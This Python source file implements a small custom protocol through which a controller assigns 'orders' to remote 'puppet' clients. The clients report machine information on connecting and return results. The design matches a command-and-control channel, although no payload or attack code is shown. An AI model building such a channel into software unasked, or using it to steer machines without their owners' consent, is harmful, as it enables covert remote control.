# MCP Monkey Control Protocol
# Protocol used for MOP <--> PUPPET communication
# Probably the ugliest protocol someone can invent
# Uses the \r\n delimiter for knowing method body border 
# and end of packet
# 
# Packet structure:
# +------------+
# | METHOD\r\n |
# +------------+
# | json data  |
# | ...        |
# | ...        |
# | ...\r\n    |
# +------------+
import json
from uuid import uuid1 as uuid
from utilities import *
import enum
from uuid import uuid1 as getUUID
import sys
import time
import select
import socket 
import errno

DELIM = "\r\n"
WSAEWOULDBLOCK = 10035 # Not defined on Linux platforms

class McpUnknownMethod(Exception):
    message = "{} is an unknown mcp method"
    def __init__(self, method):
        super().__init__(self.message.format(method))

class McpDecodeException(Exception):
    message = "couldn't parse json arguments: {}"
    def __init__(self, args):
        super().__init__(self.message.format(args))

class McpBadRequest(Exception):
    def __init__(self):
        super().__init__("Malformed or illegal packet")

class McpPacket:
    availableMethods = ("HEY", "WELCOME", "ORDER", "BRUH", "YEAH")
    method = None
    args = None
    def __init__(self, method, args=None, _payload=False):
        if not method in self.availableMethods:
            raise McpUnknownMethod(method)
        
        self.method = method
        if method == "HEY" and not _payload:
            self.args = getMachineInfo()
        else:
            self.args = args
    
    #convert object to binary payload
    def payload(self):
        data = self.method + DELIM
        if self.args:
            data += json.dumps(self.args)

        data += DELIM
        return data.encode()
    
    #construct object from payload data
    def fromPayload(data):
        if type(data) == bytes:
            data = data.decode()

        method, args = data.split(DELIM, 1)
        if len(args) == 0:
            args = None
        else: 
            try: 
                args = json.loads(args.replace(DELIM, ""))
            except json.decoder.JSONDecodeError:
                raise McpDecodeException(args)

        return McpPacket(method, args, _payload=True)
    
    def __str__(self):
        return f"<McpPacket method={self.method} args={self.args}>"

# Puppet --> MOP
# This packet is the first sent to the mop, it rapresents a connection and contains
# some infos about the puppet system
class McpHey(McpPacket):
    def __init__(self):
        super().__init__("HEY")

# MOP --> Puppet
# The mop acknowledges the puppet connections and gives him an id
class McpWelcome(McpPacket):
    def __init__(self, puppetId):
        super().__init__("WELCOME", {"id": puppetId})

# MOP --> Puppet
# Order assigned to puppet
class McpOrder(McpPacket):
    def __init__(self, order):
        super().__init__("ORDER", {"order": order})

# Puppet --> MOP
# Result of assigned order
class McpYeah(McpPacket):
    def __init__(self, result):
        super().__init__("YEAH", {"result": result})

# MOP <--> PUPPET
# Contains error messages
class McpBruh(McpPacket):
    def __init__(self, msg="Something went wrong"):
        super().__init__("BRUH", {"error": msg})

class McpBuffer:
    delim = DELIM.encode()
    def __init__(self, s, recvSize=2048):
        self.buffer = b""
        self.prevLen = 0
        self.s = s
        self.recvSize = recvSize

        if self.s.getblocking() == True:
            self.s.setblocking(0) 

    def clear(self):
        self.buffer = b""

    def nextPacket(self, timeout=None):
        header = False
        body = False
        packet = b""
        while True:
            try: 
                self.buffer += self.s.recv(self.recvSize)
                if not self.buffer:
                    raise socket.error(errno.ECONNRESET, "Connection reset by peer")
            except socket.error as e:
                if e.errno == errno.EAGAIN or e.errno == WSAEWOULDBLOCK:
                    # This blocks the socket until the data is available 
                    r, w, x = select.select([self.s], [], [], timeout) 
                    # When nextPacket is ran with a timeout, it won't block the calling function,
                    # just throw BlockingIOError
                    if (r, w, x) == ([], [], []) and timeout:
                        raise BlockingIOError()
                elif e.errno == errno.ECONNRESET:
                    raise ConnectionResetError()
                else:
                    raise OSError(e.errno)

            # Check for bad header, (it should be METHOD\r\n and not METHOD\n)
            if self.buffer.find(self.delim[0]) == -1 and self.buffer.find(self.delim[1]) > -1:
                self.clear()
                raise McpBadRequest()
            
            first = self.buffer.find(self.delim)
            if first != -1:
                # Slice out the useful data and remove it from the buffer as it is consumed
                packet += self.buffer[:first + 2]
                self.buffer = self.buffer[first + 2:]
                if not header:
                    header = True
                    last = self.buffer.rfind(self.delim)
                    # Since both the header and body may be received in a single recv
                    # We check if there are two delimiter
                    if first != last and last != -1:
                        body = True
                        packet += self.buffer[:last + 2]
                        self.buffer = self.buffer[last + 2:]
                else:
                    body = True
            
            # Construct the McpPacket object 
            if header and body:
                try:
                    return McpPacket.fromPayload(packet)
                except (McpUnknownMethod, McpDecodeException):
                    self.clear()
                    raise McpBadRequest()
                        
    #TODO
    def sendPacket(self, packet):
        packet = packet.payload()
        sent = self.s.send(packet)
